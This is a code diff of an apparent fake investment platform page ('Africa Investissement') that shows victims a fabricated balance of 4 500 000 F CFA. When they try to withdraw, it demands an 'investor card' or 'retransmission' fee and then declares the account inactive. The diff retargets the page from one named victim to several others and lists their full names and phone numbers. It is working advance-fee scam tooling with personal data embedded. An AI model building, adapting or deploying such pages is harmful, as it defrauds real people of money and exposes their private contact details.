@@ -13,6 +13,7 @@
             padding: 0;
             background-color: #121212;
             color: #ffffff;
+            position: relative;
         }
 
         header {
@@ -224,6 +225,41 @@
             text-align: center;
             padding: 20px 0;
         }
+
+        .popup{
+            width: 300px;
+            height: fit-content;
+            border-radius: 10px;
+            background: #d9d9d9;
+            position: fixed;
+            top: 40%;
+            left: 10%;
+            z-index: 10000;
+            color: black;
+            padding: 10px;
+            display: none;
+        }
+
+        .popup select{
+            width: 100%;
+            border-radius: 10px;
+            padding: 10px;
+            background: #a9a8a8;
+        }
+
+        .popup-2{
+            width: 300px;
+            height: fit-content;
+            border-radius: 10px;
+            background: #d9d9d9;
+            position: fixed;
+            top: 40%;
+            left: 10%;
+            z-index: 10000;
+            color: black;
+            padding: 10px;
+            display: none;
+        }
     </style>
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 </head>
@@ -231,7 +267,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0976375525") {
+        if (code === "91127982") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +281,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 2 100 $</span>
+                <span class="balance">Solde: 4 500 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name"> MUKEBA MULANGA AIMEE </span><br>
-                    <span id="user-phone"> 243 0976375525</span>
+                    <span id="user-name">  </span><br>
+                    <span id="user-phone"> </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +313,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Airtel Money</button>
+                <button id="orange-money">Retirer via Mobile Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -288,6 +324,7 @@
             <section class="error-message" id="error-message"></section>
         </div>
     </main>
+    
     <footer>
         <p>© 2024 Africa Investissement. Tous droits réservés.</p>
     </footer>
@@ -309,19 +346,31 @@
 
             setInterval(updatePrice, 5000);
 
-            const setWithdrawalInfo = (method) => {
-                const accountName = "MUKEBA MULANGA AIMEE";
-                const accountNumber = "243 097637552";
-                const balance = " 2 100 $";
+            const setWithdrawalInfo = (method, nom, numero) => {
+                const accountName = "Nom : " + nom.slice(8)
+                const accountNumber = 'Numero : ' + numero;
+                const balance = " 4 500 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel Money ?");
-                if (confirmWithdrawal) {
-                    setWithdrawalInfo("Airtel");
-                }
+                // const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel Money ?");
+                const popup = document.querySelector('.popup')
+                popup.style.display = "block"
+                const selectWithdraw = document.querySelector('.popup select')
+                
+                selectWithdraw.addEventListener('change', (event) => {
+                    const selectedValue = event.target.value;
+                    const nom = selectedValue
+                    const numero = parseInt(selectedValue)
+                    console.log(`Vous avez choisi : ${selectedValue}`);
+                    setWithdrawalInfo("Mobile Money", nom, numero)
+                    popup.style.display = "none"
+                });
+                // if (confirmWithdrawal) {
+                //     setWithdrawalInfo("Airtel");
+                // }
             });
 
             document.getElementById('paypal').addEventListener('click', () => {
@@ -332,10 +381,16 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MUKEBA, veuillez payer les frais de retransmission qui sont de 500 $ afin de recevoir vos bénéfices immediatement. Merci');
-                withdrawalForm.style.display = 'none';
-                errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : compte inactif.';
+                const popup2 = document.querySelector(".popup-2")
+                popup2.style.display = "block" 
+                const btnValider = document.querySelector(".popup-2 button")
+                btnValider.addEventListener('click', () => {
+                    alert('Cher MEGBLETO, veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices immediatement. Merci');
+                    withdrawalForm.style.display = 'none';
+                    errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'Erreur : compte inactif.';
+                    popup2.style.display = "none" 
+                })
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
@@ -363,6 +418,21 @@
             });
         });
     </script>
+
+<div class="popup">
+    <h3 style="text-align: center;">Veuillez selectionner le numéro de telephone</h3>
+    <select name="" id="">
+        <option value="62151260 MEGBLETO HELTINE">62151260 MEGBLETO HELTINE</option>
+        <option value="91127982 MEGBLETO ASTRID">91127982 MEGBLETO ASTRID</option>
+        <option value="91577855 OSWALDINE HOUNSA">91577855 OSWALDINE HOUNSA</option>
+        <option value="97119703 AHLOU CONSTANCE">97119703 AHLOU CONSTANCE</option>
+    </select>
+</div>
+<div class="popup-2">
+    <h1>Valider le montant du retrait</h1>
+    <input type="number" />
+    <button>Valider</button>
+</div>
 </body>
 
 </html>
